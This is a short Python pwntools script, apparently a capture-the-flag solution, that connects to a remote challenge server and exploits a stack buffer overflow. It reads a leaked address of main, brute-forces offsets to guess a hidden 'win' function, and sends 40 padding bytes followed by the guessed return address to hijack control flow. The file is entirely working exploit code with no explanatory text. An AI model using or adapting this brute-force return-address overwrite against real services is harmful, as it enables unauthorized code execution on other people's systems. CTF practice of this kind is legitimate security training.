from pwn import *
import time

#p = process("./sample")
#gdb.attach(p)



for i in range(-250,250):
    p = remote("peeweectf.com", 9000)

    main = int(p.recvline().split(b" ")[2].decode()[:-2], 16)
    print(hex(main))

    win = main+i
    ret = win-367
    print(hex(win))
    print(hex(ret))

    payload = b"A"*40 + p64(win) + p64(main)
    p.recvline()
    p.sendline(payload)
    try:
        print(p.recvline())
    except:
        continue
    p.close()

